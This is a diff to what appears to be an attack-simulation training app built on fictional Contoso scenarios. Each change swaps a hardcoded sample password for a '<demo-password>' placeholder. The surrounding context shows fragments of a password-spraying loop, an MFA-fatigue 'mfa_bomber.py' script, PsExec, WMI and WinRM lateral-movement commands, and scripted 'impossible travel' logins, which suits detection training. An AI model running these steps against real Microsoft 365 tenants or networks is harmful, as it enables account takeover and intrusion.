@@ -21,7 +21,7 @@ $users = @(
     "erin@contoso.com"
 )
 
-$passwords = @("Spring2024!", "Welcome1!", "Password123")
+$passwords = @("<demo-password-1>", "<demo-password-2>", "<demo-password-3>")
 
 foreach ($password in $passwords) {
     foreach ($user in $users) {
@@ -47,7 +47,7 @@ foreach ($password in $passwords) {
   'mfa-fatigue': {
     reconnaissance: [
       { type: 'info', message: 'Credentials obtained from dark web marketplace' },
-      { type: 'command', tool: 'curl', command: 'curl -X POST https://login.microsoftonline.com/contoso.com/oauth2/token -d "username=erin@contoso.com&password=Str0ngP@ss!"', output: '{"error":"interaction_required","error_description":"MFA required"}' },
+      { type: 'command', tool: 'curl', command: 'curl -X POST https://login.microsoftonline.com/contoso.com/oauth2/token -d "username=erin@contoso.com&password=<demo-password>"', output: '{"error":"interaction_required","error_description":"MFA required"}' },
     ],
     execution: [
       { type: 'script', language: 'python', name: 'mfa_bomber.py', code: `#!/usr/bin/env python3
@@ -58,7 +58,7 @@ import time
 from datetime import datetime
 
 TARGET = "erin@contoso.com"
-PASSWORD = "Str0ngP@ss!"  # Obtained from credential dump
+PASSWORD = "<demo-password>"  # Obtained from credential dump in this simulated scenario
 
 def send_mfa_push():
     """Trigger MFA push notification"""
@@ -200,7 +200,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 
 $cred = New-Object System.Management.Automation.PSCredential(
     "CONTOSO\\Administrator", 
-    (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)
+    (ConvertTo-SecureString "<demo-password>" -AsPlainText -Force)
 )
 
 # Method 1: WMI Remote Process Creation
@@ -211,7 +211,7 @@ Invoke-WmiMethod -Class Win32_Process -Name Create \`
 
 # Method 2: PsExec
 Write-Host "[*] Establishing PsExec session to SERVER-SQL01..."
-.\\PsExec.exe \\\\SERVER-SQL01 -u CONTOSO\\Administrator -p P@ssw0rd123! cmd.exe
+.\\PsExec.exe \\\\SERVER-SQL01 -u CONTOSO\\Administrator -p <demo-password> cmd.exe
 
 # Method 3: WinRM/PowerShell Remoting
 Write-Host "[*] Creating PowerShell session to SERVER-FILE01..."
@@ -420,7 +420,7 @@ openvpn --config nyc-vpn.ovpn --daemon
 sleep 5
 echo "[*] Logging into M365 from New York (IP: 198.51.100.23)..."
 curl -X POST "https://login.microsoftonline.com/contoso.com/oauth2/token" \\
-    -d "grant_type=password&username=dana@contoso.com&password=CompromisedPass123"
+    -d "grant_type=password&username=dana@contoso.com&password=<demo-password>"
 
 # Wait 15 minutes
 sleep 900
@@ -432,7 +432,7 @@ openvpn --config tokyo-vpn.ovpn --daemon
 sleep 5
 echo "[*] Logging into M365 from Tokyo (IP: 103.75.201.4)..."
 curl -X POST "https://login.microsoftonline.com/contoso.com/oauth2/token" \\
-    -d "grant_type=password&username=dana@contoso.com&password=CompromisedPass123"
+    -d "grant_type=password&username=dana@contoso.com&password=<demo-password>"
 
 echo "[+] Impossible travel scenario executed"
 echo "    Distance: 10,800 km"
